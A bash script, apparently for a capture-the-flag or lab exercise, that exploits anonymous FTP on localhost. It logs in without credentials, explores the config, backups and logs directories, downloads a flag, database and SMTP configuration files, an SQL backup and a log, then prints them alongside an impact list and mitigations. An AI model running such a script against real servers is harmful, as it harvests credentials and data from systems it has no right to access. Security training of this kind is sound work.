#!/bin/bash

# FTP Anonymous Login Vulnerability Exploitation Script
# This script demonstrates how to exploit anonymous FTP access

echo "=========================================="
echo "FTP Anonymous Login Vulnerability Exploit"
echo "=========================================="
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
FTP_HOST="localhost"
FTP_PORT="21"
TEMP_DIR="./ftp_exploit_results"

# Create temporary directory for downloaded files
mkdir -p "$TEMP_DIR"

echo -e "${YELLOW}üîç Step 1: Testing FTP Anonymous Login${NC}"
echo "Attempting to connect to $FTP_HOST:$FTP_PORT..."
echo ""

# Test 1: Anonymous login with blank credentials
echo -e "${BLUE}Test 1: Anonymous login (username: anonymous, password: blank)${NC}"
ftp -n "$FTP_HOST" "$FTP_PORT" << EOF
user anonymous
ls
quit
EOF

echo ""
echo -e "${BLUE}Test 2: Anonymous login (username: ftp, password: ftp)${NC}"
ftp -n "$FTP_HOST" "$FTP_PORT" << EOF
user ftp ftp
ls
quit
EOF

echo ""
echo -e "${YELLOW}üîç Step 2: Exploring Directory Structure${NC}"
echo ""

# Create FTP commands file for exploration
cat > /tmp/ftp_explore.txt << 'EOF'
user anonymous
ls
cd public
ls
cd ..
cd config
ls
cd ..
cd backups
ls
cd ..
cd logs
ls
cd ..
quit
EOF

echo "Exploring directory structure..."
ftp -n "$FTP_HOST" "$FTP_PORT" < /tmp/ftp_explore.txt

echo ""
echo -e "${YELLOW}üîç Step 3: Downloading Sensitive Files${NC}"
echo ""

# Download sensitive files
echo "Downloading sensitive files to $TEMP_DIR..."

# Create FTP download commands
cat > /tmp/ftp_download.txt << EOF
user anonymous
binary
cd public
get flag.txt $TEMP_DIR/flag.txt
cd ../config
get database.conf $TEMP_DIR/database.conf
get smtp.conf $TEMP_DIR/smtp.conf
cd ../backups
get db_backup.sql $TEMP_DIR/db_backup.sql
cd ../logs
get server.log $TEMP_DIR/server.log
quit
EOF

ftp -n "$FTP_HOST" "$FTP_PORT" < /tmp/ftp_download.txt

echo ""
echo -e "${YELLOW}üîç Step 4: Analyzing Downloaded Files${NC}"
echo ""

# Display contents of downloaded files
if [ -f "$TEMP_DIR/flag.txt" ]; then
    echo -e "${GREEN}‚úÖ Flag found:${NC}"
    cat "$TEMP_DIR/flag.txt"
    echo ""
fi

if [ -f "$TEMP_DIR/database.conf" ]; then
    echo -e "${RED}üö® Database credentials exposed:${NC}"
    cat "$TEMP_DIR/database.conf"
    echo ""
fi

if [ -f "$TEMP_DIR/smtp.conf" ]; then
    echo -e "${RED}üö® SMTP credentials exposed:${NC}"
    cat "$TEMP_DIR/smtp.conf"
    echo ""
fi

if [ -f "$TEMP_DIR/db_backup.sql" ]; then
    echo -e "${RED}üö® Database backup exposed:${NC}"
    head -5 "$TEMP_DIR/db_backup.sql"
    echo "..."
    echo ""
fi

if [ -f "$TEMP_DIR/server.log" ]; then
    echo -e "${RED}üö® Server logs exposed:${NC}"
    cat "$TEMP_DIR/server.log"
    echo ""
fi

echo ""
echo -e "${YELLOW}üîç Step 5: Vulnerability Assessment${NC}"
echo ""

echo -e "${RED}üö® VULNERABILITY CONFIRMED:${NC}"
echo "   ‚úì Anonymous FTP access enabled"
echo "   ‚úì Sensitive files accessible"
echo "   ‚úì Database credentials exposed"
echo "   ‚úì SMTP credentials exposed"
echo "   ‚úì Server logs accessible"
echo "   ‚úì Database backups accessible"
echo ""

echo -e "${YELLOW}üìã Attack Impact:${NC}"
echo "   ‚Ä¢ Information disclosure"
echo "   ‚Ä¢ Credential harvesting"
echo "   ‚Ä¢ Database access potential"
echo "   ‚Ä¢ Email system compromise"
echo "   ‚Ä¢ Lateral movement opportunity"
echo ""

echo -e "${YELLOW}üõ°Ô∏è Mitigation Recommendations:${NC}"
echo "   ‚Ä¢ Disable anonymous access (anonymous_enable=NO)"
echo "   ‚Ä¢ Implement proper authentication"
echo "   ‚Ä¢ Use SFTP/FTPS instead of FTP"
echo "   ‚Ä¢ Restrict file permissions"
echo "   ‚Ä¢ Implement network segmentation"
echo "   ‚Ä¢ Regular security audits"
echo ""

echo -e "${GREEN}üìÅ Downloaded files saved to: $TEMP_DIR${NC}"
echo ""

# Cleanup
rm -f /tmp/ftp_explore.txt /tmp/ftp_download.txt

echo "=========================================="
echo "Exploitation demonstration completed!"
echo "==========================================" 